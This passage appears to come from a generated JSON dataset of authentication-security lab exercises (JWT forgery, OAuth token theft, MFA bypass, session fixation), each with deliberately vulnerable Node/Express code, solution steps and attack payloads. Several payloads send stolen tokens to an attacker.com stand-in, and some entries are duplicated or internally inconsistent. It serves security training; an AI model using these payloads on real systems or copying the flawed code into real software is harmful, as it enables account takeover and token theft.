    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.get('/admin', async (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.decode(token, {complete: true});const jwks = await axios.get(decoded.header.jku);const key = jwks.data.keys[0];jwt.verify(token, key);res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MifQ.eyJ1c2VyIjoiYWRtaW4ifQ.EPV9...",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vbWFsY2RuLmNvbS9tYWxpY2lvdXMuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.KJB2..."
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in OAuth redirect_uri parameter",
    "Lab Description": "The OAuth implementation allows arbitrary redirect_uri values and reflects session tokens in URL fragments. The application [stores session tokens client-side]. To solve: Chain XSS in redirect_uri with session fixation to hijack user sessions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth flow using OWASP ZAP",
      "Craft malicious redirect_uri with XSS payload",
      "Trigger victim to initiate OAuth flow",
      "Capture session token from reflected fragment",
      "Fixate session using stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/auth', (req, res) => {const {redirect_uri} = req.query;const token = generateToken();res.redirect(`${redirect_uri}#token=${token}`);});app.get('/profile', (req, res) => {const token = req.query.token || req.cookies.session;if(validateToken(token)) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://attacker.com/xss.html%23",
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=data:text/html,<script>document.location='http://attacker.com/?token='+document.location.hash.substring(7)</script>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP method tampering on verification endpoint",
    "Lab Description": "The MFA verification endpoint fails to enforce proper HTTP method validation. The application [processes GET and POST identically]. To solve: Bypass MFA by converting POST verification to GET request with parameters in query string.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification POST request with Burp Suite",
      "Change method from POST to GET",
      "Move parameters from body to query string",
      "Resend request without valid MFA code",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.all('/mfa/verify', (req, res) => {const code = req.body.code || req.query.code;if(code === '123456') res.send('Verified');else res.status(403).send('Invalid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "GET /mfa/verify?code=123456 HTTP/1.1",
      "GET /mfa/verify?code= HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-sensitive password comparison",
    "Lab Description": "The authentication endpoint performs case-sensitive password comparison against lowercase stored values. The application [stores passwords in lowercase]. To solve: Perform credential stuffing attack using lowercase variants of known password leaks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify authentication endpoint using OWASP ZAP",
      "Load known credential lists into Burp Intruder",
      "Configure payload processing to lowercase all passwords",
      "Execute attack with processed payloads",
      "Identify successful authentications"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{user:'admin',pass:'secret123'}];app.post('/login', (req, res) => {const {user, pass} = req.body;const account = users.find(u => u.user === user);if(account && account.pass === pass.toLowerCase()) res.send('Logged in');else res.status(401).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"SECRET123\"}",
      "{\"user\":\"admin\",\"pass\":\"SeCrEt123\"}"
    ]
  },
  {
    "Lab scenario": "Session hijacking via GraphQL batch query IDOR",
    "Lab Description": "The GraphQL endpoint processes batch queries with shared authentication context. The application [reuses session for all queries in batch]. To solve: Inject unauthorized queries alongside legitimate ones in batch request to access other users' data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GraphQL batch endpoint using Postman",
      "Capture legitimate authenticated query",
      "Construct batch request mixing authorized and unauthorized queries",
      "Embed session hijacking query targeting admin data",
      "Extract sensitive data from batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const {graphqlHTTP} = require('express-graphql');const app = express();app.use('/graphql', graphqlHTTP({schema: schema,batch: true}));app.listen(3000);",
    "payloads": [
      "[{\"query\":\"query { myProfile { email }}\"},{\"query\":\"query { user(id:1) { privateData }}\"}]",
      "[{\"query\":\"mutation { changePassword(new:\\\"hacked\\\")}\"},{\"query\":\"query { allUsers { apiKeys }}\"}]"
    ]
  },
  {
    "Lab scenario": "JWT brute-force via weak HS256 secret in debug endpoint",
    "Lab Description": "The debug endpoint leaks JWT verification secrets through verbose error messages. The application [exposes secret in HMAC-SHA256 validation failures]. To solve: Extract weak secret from error response and forge admin token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send malformed JWT to debug endpoint using Burp Suite",
      "Extract secret key from verbose error message",
      "Use cracked secret to sign new admin token",
      "Bypast rate limiting by varying JWT claims",
      "Access admin dashboard with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/debug', (req, res) => {try {jwt.verify(req.body.token, 'secret123', {algorithms:['HS256']});res.send('Valid');} catch(e) {res.send(`Error: ${e.message} using secret secret123`);}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.InvalidToken\"}",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.7J2Q..."
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via asymmetric to symmetric substitution",
    "Lab Description": "The JWT implementation accepts both asymmetric and symmetric algorithms but fails to validate the signing method consistently. The application [treats RS256 as HS256 when key is embedded]. To solve: Convert public key to symmetric secret and forge valid tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Extract public key from application's /.well-known/jwks.json endpoint",
      "Convert RSA public key to PEM format using Burp Suite",
      "Modify JWT header to use HS256 algorithm instead of RS256",
      "Sign new token using public key as symmetric secret",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const publicKey = fs.readFileSync('./public.pem');app.post('/verify', (req, res) => {try {jwt.verify(req.body.token, publicKey, {algorithms: ['RS256','HS256']});res.send('Valid');} catch(e) {res.status(403).send('Invalid');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth token endpoint is embedded in iframes with overly permissive CSP headers. The application [leaks tokens through postMessage events]. To solve: Craft malicious page that extracts tokens via iframe CSP bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Analyze CSP headers for unsafe-eval or unsafe-inline directives",
      "Create malicious page embedding target iframe",
      "Inject JavaScript to intercept postMessage events",
      "Extract OAuth tokens from message data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self' 'unsafe-inline'\");res.send(`<script>parent.postMessage({token:'secret123'},'*')</script>`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/iframe\" onload=\"window.addEventListener('message',e=>document.location='http://attacker.com/?token='+e.data.token)\"></iframe>",
      "<script>var iframe=document.createElement('iframe');iframe.src='https://victim.com/oauth/iframe';document.body.appendChild(iframe);window.addEventListener('message',e=>fetch('http://attacker.com',{method:'POST',body:e.data.token}));</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake parameter injection",
    "Lab Description": "The WebSocket connection assigns session tokens based on unvalidated handshake parameters. The application [trusts ws:// URL parameters for session binding]. To solve: Inject session token through crafted WebSocket URL and force victim to authenticate.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket connection using Burp Suite",
      "Modify handshake request to include session parameter",
      "Create malicious page initiating WebSocket connection",
      "Trigger victim to authenticate during active WebSocket session",
      "Take over authenticated session using fixated token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({server: app.listen(3000)});wss.on('connection', (ws, req) => {const session = new URL(req.url,'ws://localhost').searchParams.get('session');ws.session = session || uuidv4();});",
    "payloads": [
      "ws://victim.com/chat?session=malicious123",
      "new WebSocket('ws://victim.com/chat?session=fixed_session_id')"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-based one-time password prediction",
    "Lab Description": "The TOTP implementation uses insufficient entropy in seed generation. The application [generates predictable MFA seeds based on username]. To solve: Calculate valid TOTP codes by reverse-engineering the seed generation algorithm.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enroll multiple test accounts and collect their TOTP seeds",
      "Analyze seed patterns using Python scripts",
      "Reverse-engineer seed generation formula",
      "Calculate victim's likely seed based on username",
      "Generate valid TOTP codes using predicted seed"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const speakeasy = require('speakeasy');const app = express();app.post('/mfa/enroll', (req, res) => {const seed = Buffer.from(req.body.username).toString('hex').slice(0,10);const otp = speakeasy.generateSecret({seed});res.json(otp);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"username\":\"carlos\",\"code\":\"123456\"}",
      "{\"username\":\"admin\",\"code\":\"654321\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive username matching",
    "Lab Description": "The authentication endpoint performs case-insensitive username comparison but case-sensitive password checks. The application [stores usernames in lowercase but preserves case in passwords]. To solve: Perform credential stuffing with case-varied usernames against known password lists.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify authentication endpoint using OWASP ZAP",
      "Load known username lists into Burp Intruder",
      "Configure payload processing to lowercase usernames",
      "Execute attack with case-varied username payloads",
      "Identify successful authentications through response differences"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{user:'admin',pass:'Secret123!'}];app.post('/login', (req, res) => {const {user, pass} = req.body;const account = users.find(u => u.user === user.toLowerCase());if(account && account.pass === pass) res.send('Logged in');else res.status(401).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"user\":\"Admin\",\"pass\":\"Secret123!\"}",
      "{\"user\":\"ADMIN\",\"pass\":\"Secret123!\"}"
    ]
  },
  {
    "Lab scenario": "JWT key injection via jwk header parameter",
    "Lab Description": "The JWT validation improperly processes embedded jwk headers in tokens. The application [trusts self-signed keys without verification]. To solve: Inject malicious RSA public key in jwk header and sign token with corresponding private key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode structure",
      "Generate new RSA key pair using OpenSSL",
      "Craft jwk header with attacker's public key",
      "Sign new token with attacker's private key",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/admin', (req, res) => {try {const decoded = jwt.verify(req.body.token, (header, payload, done) => {const key = header.jwk ? jwkToPem(header.jwk) : publicKey;done(null, key);});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhBZGluIiwiZSI6IkFRQUIifX0.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhNYWxpY2lvdXMiLCJlIjoiQVFBQiJ9fQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect",
    "Lab Description": "The OAuth implementation allows arbitrary redirect_uri values through an open redirect vulnerability. The application [leaks tokens in URL fragments]. To solve: Chain open redirect with token leakage to steal authentication tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth flow using OWASP ZAP",
      "Find open redirect endpoint in application",
      "Craft malicious redirect_uri pointing to open redirect",
      "Trigger authentication flow and capture token",
      "Use stolen token to access victim's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = generateToken();res.redirect(`${req.query.redirect_uri}#token=${token}`);});app.get('/redirect', (req, res) => {res.redirect(req.query.url);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://victim.com/redirect?url=https://attacker.com",
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://victim.com/redirect?url=data:text/html,<script>document.location='http://attacker.com/?token='+document.location.hash.substring(7)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket subscriptions",
    "Lab Description": "The GraphQL subscription endpoint assigns session tokens over websockets before authentication. The application [reuses connection IDs as session tokens]. To solve: Establish websocket connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish GraphQL websocket connection using Postman",
      "Note connection ID in initial handshake response",
      "Create malicious page that forces victim to authenticate over your connection",
      "Monitor subscription channel for victim's data",
      "Use captured session token in regular HTTP requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer} = require('http');const {SubscriptionServer} = require('subscriptions-transport-ws');const server = createServer();SubscriptionServer.create({onConnect: (connParams, socket) => {socket.id = uuidv4();}}, {server, path: '/graphql'});server.listen(3000);",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"FIXATED_ID\"}}",
      "{\"query\":\"subscription {userAuth {token}}\",\"variables\":{}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status code manipulation",
    "Lab Description": "The MFA verification endpoint relies on client-side status code interpretation. The application [processes failed verifications as successes]. To solve: Intercept and modify status code from 403 to 200 to bypass MFA.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Submit invalid verification code",
      "Modify response status code from 403 to 200",
      "Forward modified response to client",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') res.status(200).send('Verified');else res.status(403).send('Invalid code');});app.get('/dashboard', (req, res) => {if(req.session.verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"111111\"}",
      "HTTP/1.1 200 OK\r\nContent-Length: 8\r\n\r\nVerified"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password reset timing attack",
    "Lab Description": "The password reset endpoint leaks account existence through response timing. The application [takes longer to respond for valid accounts]. To solve: Perform timing attack to enumerate valid accounts then credential stuff with known passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify password reset endpoint using OWASP ZAP",
      "Measure response times for known valid/invalid accounts",
      "Automate timing attack with Burp Intruder",
      "Identify accounts with statistically significant longer responses",
      "Perform credential stuffing against enumerated accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{email:'admin@victim.com'}];app.post('/reset-password', (req, res) => {const user = users.find(u => u.email === req.body.email);if(user) {expensiveHash(req.body.email);res.send('If account exists, email sent');} else {res.send('If account exists, email sent');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"email\":\"admin@victim.com\"}",
      "{\"email\":\"unknown@test.com\"}"
    ]
  },
  {
    "Lab scenario": "Session hijacking via JWT cross-service replay",
    "Lab Description": "The same JWT secret is used across multiple microservices. The application [shares verification keys between services]. To solve: Capture low-privilege token from one service and replay it to privileged endpoints in another service.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Obtain valid JWT from user-facing service using Burp Suite",
      "Identify administrative API endpoints through documentation",
      "Replay captured token to administrative endpoints",
      "Escalate privileges by modifying token claims",
      "Access restricted functionality across services"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();const secret = 'shared-secret-123';app.post('/admin/api', (req, res) => {try {const decoded = jwt.verify(req.headers.authorization, secret);res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via empty signature",
    "Lab Description": "The JWT validation fails when encountering tokens with empty signatures. The application [incorrectly processes unsigned tokens as valid]. To solve: Remove the signature portion from a valid JWT while keeping the header and payload intact to bypass authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Remove the signature portion completely",
      "Submit the modified token ending with a dot",
      "Access privileged endpoints with the unsigned token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, 'secret', {algorithms:['HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS",
    "Lab Description": "The OAuth token endpoint has overly permissive CORS headers. The application [exposes tokens to arbitrary origins]. To solve: Craft malicious JavaScript to retrieve tokens cross-origin and exfiltrate them to an attacker-controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth token endpoint using OWASP ZAP",
      "Analyze CORS headers for Access-Control-Allow-Origin values",
      "Create malicious page with XMLHttpRequest to token endpoint",
      "Configure server to receive exfiltrated tokens",
      "Trigger victim to visit malicious page"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use((req, res, next) => {res.set('Access-Control-Allow-Origin', '*');next();});app.post('/oauth/token', (req, res) => {res.json({access_token: 'secret123'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script>fetch('https://victim.com/oauth/token').then(r=>r.json()).then(d=>fetch('https://attacker.com/?token='+d.access_token))</script>",
      "var xhr=new XMLHttpRequest();xhr.open('POST','https://victim.com/oauth/token');xhr.onload=function(){document.location='https://attacker.com/?token='+JSON.parse(this.responseText).access_token};xhr.send();"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSON Web Encryption",
    "Lab Description": "The application uses JWE tokens for session management but fails to validate key ownership. The application [accepts encrypted tokens with attacker-controlled keys]. To solve: Generate new encryption key pair, create JWE token with victim's session data, and fixate session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze JWE token structure using Burp Suite",
      "Generate new RSA key pair using OpenSSL",
      "Encrypt valid session payload with attacker's public key",
      "Inject crafted JWE token via cookie manipulation",
      "Force victim to use the fixated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jose = require('node-jose');const app = express();app.get('/profile', async (req, res) => {try {const keystore = jose.JWK.createKeyStore();await keystore.add(req.cookies.key,'pem');const decrypted = await jose.JWE.createDecrypt(keystore).decrypt(req.cookies.session);res.send('User profile');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZHQ00ifQ.eyJzZXNzaW9uIjoiMTIzIn0.KAQ...",
      "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZHQ00ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.LSI..."
    ]
  },
  {
    "Lab scenario": "MFA bypass via parallel session exploitation",
    "Lab Description": "The MFA verification doesn't invalidate existing sessions after completion. The application [allows multiple concurrent sessions]. To solve: Maintain authenticated session while completing MFA in different browser to bypass verification requirement.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in and obtain pre-MFA session cookie using Burp Suite",
      "Preserve this session in one browser instance",
      "Complete MFA verification in separate browser instance",
      "Reuse original session cookie to access protected resources",
      "Access privileged endpoints without completing MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/login', (req, res) => {const session = uuidv4();sessions[session] = {user: req.body.user, mfaVerified: false};res.cookie('session', session);res.send('Complete MFA');});app.post('/verify-mfa', (req, res) => {sessions[req.cookies.session].mfaVerified = true;res.send('Verified');});app.get('/admin', (req, res) => {if(sessions[req.cookies.session].mfaVerified) res.send('Admin panel');else res.status(403).send('MFA required');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "Cookie: session=pre-mfa-session",
      "Cookie: session=verified-session"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key confusion attack",
    "Lab Description": "The JWT implementation accepts both symmetric and asymmetric algorithms but fails to properly validate key types. The application [treats public keys as HMAC secrets]. To solve: Exploit algorithm confusion to forge valid tokens by signing with the public key as an HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Extract public key from application's /.well-known/jwks.json endpoint",
      "Convert public key to PEM format using OpenSSL",
      "Modify JWT header to use HS256 algorithm",
      "Sign token using public key as HMAC secret",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const publicKey = fs.readFileSync('./public.pem');app.post('/admin', (req, res) => {try {jwt.verify(req.body.token, publicKey, {algorithms: ['RS256','HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via referer header leakage",
    "Lab Description": "The OAuth implementation leaks access tokens through referer headers when loading external resources. The application [includes tokens in GET parameters]. To solve: Craft malicious page that triggers resource loading to capture tokens through referer headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in referer headers",
      "Create malicious page with embedded resources",
      "Trigger victim to visit page while authenticated",
      "Capture token from server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<img src=\"https://external.com/logo.png\">`);});app.get('/profile', (req, res) => {if(req.headers.authorization === `Bearer ${token}`) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<img src=\"http://attacker.com/collect?leak=\">",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/steal.css\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 request smuggling",
    "Lab Description": "The application's HTTP/2 implementation improperly processes session cookies across multiplexed streams. The application [assigns sessions based on first request's headers]. To solve: Craft HTTP/2 requests to fixate session cookie across multiple connections.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/2 support using Burp Suite",
      "Construct malicious HTTP/2 requests with conflicting headers",
      "Fixate session cookie in initial stream",
      "Force victim to authenticate over same connection",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({cert:fs.readFileSync('server.crt'),key:fs.readFileSync('server.key')});server.on('stream', (stream, headers) => {if(!headers['cookie']) headers['cookie'] = `session=${uuidv4()}`;stream.respond({'content-type':'text/html'});stream.end('Response');});server.listen(3000);",
    "payloads": [
      "GET / HTTP/2\r\nHost: victim.com\r\nCookie: session=malicious123\r\n\r\n",
      "POST /login HTTP/2\r\nHost: victim.com\r\nCookie: session=malicious123\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via response manipulation",
    "Lab Description": "The MFA verification relies on client-side validation of success responses. The application [processes all 200 responses as successful]. To solve: Intercept and modify failed verification responses to appear successful.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Submit invalid verification code",
      "Modify response body from failure to success",
      "Forward modified response to client",
      "Observe authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') res.json({success:true});else res.json({success:false});});app.get('/dashboard', (req, res) => {if(req.session.verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"code\":\"111111\"}",
      "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"success\":true}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password reset timing attack",
    "Lab Description": "The password reset endpoint leaks account existence through response timing. The application [takes longer to process valid accounts]. To solve: Perform timing attack to enumerate valid accounts then credential stuff with common passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify password reset endpoint using OWASP ZAP",
      "Measure response times for known valid/invalid accounts",
      "Automate timing attack with Burp Intruder",
      "Identify accounts with statistically significant longer responses",
      "Perform credential stuffing against enumerated accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{email:'admin@victim.com'}];app.post('/reset-password', (req, res) => {const user = users.find(u => u.email === req.body.email);if(user) {expensiveHash(req.body.email);res.send('If account exists, email sent');} else {res.send('If account exists, email sent');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"email\":\"admin@victim.com\"}",
      "{\"email\":\"unknown@test.com\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via null signature attack",
    "Lab Description": "The JWT validation fails to properly handle tokens with null bytes in the signature. The application [incorrectly validates truncated signatures]. To solve: Craft a token with null bytes in the signature to bypass validation while maintaining valid header and payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Modify the signature to include null bytes",
      "Submit the malformed token to authentication endpoints",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/admin', (req, res) => {try {jwt.verify(req.body.token, 'secret', {algorithms:['HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.00000000",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.AAAAAAAA"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket subprotocol negotiation",
    "Lab Description": "The OAuth implementation leaks tokens during WebSocket subprotocol handshake. The application [includes sensitive tokens in Sec-WebSocket-Protocol headers]. To solve: Intercept WebSocket connections and extract tokens from handshake headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify WebSocket endpoints using OWASP ZAP",
      "Analyze WebSocket handshake requests",
      "Capture tokens from Sec-WebSocket-Protocol headers",
      "Reuse tokens in REST API requests",
      "Access privileged endpoints with stolen tokens"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({server: app.listen(3000)});wss.on('connection', (ws, req) => {const token = req.headers['sec-websocket-protocol'];ws.send('Authenticated');});",
    "payloads": [
      "Sec-WebSocket-Protocol: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
